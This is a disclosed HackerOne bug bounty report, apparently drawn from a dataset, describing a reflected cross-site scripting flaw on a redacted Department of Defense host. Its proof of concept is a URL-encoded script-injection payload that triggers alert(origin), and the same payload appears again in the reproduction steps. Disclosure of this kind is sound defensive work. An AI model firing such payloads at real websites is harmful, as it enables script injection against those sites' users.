---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1154378'
original_report_id: '1154378'
title: Reflected XSS on https://██████
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-04-07T09:32:45.950Z'
disclosed_at: '2021-06-03T16:22:26.453Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://██████

## Metadata

- HackerOne Report ID: 1154378
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-06-03T16:22:26.453Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
Reflected XSS on https://███████

POC:
https://███/████=https://████████████/%3C/script%3E%3Cscript%3Ealert(origin)%3C/script%3E&██████
## References
███████

## Impact

Unauthenticated Reflected XSS

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Step 1: Go to link: https://██████/████=https://███████████████/%3C/script%3E%3Cscript%3Ealert(origin)%3C/script%3E&████████

## Suggested Mitigation/Remediation Actions
Encoded output data

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
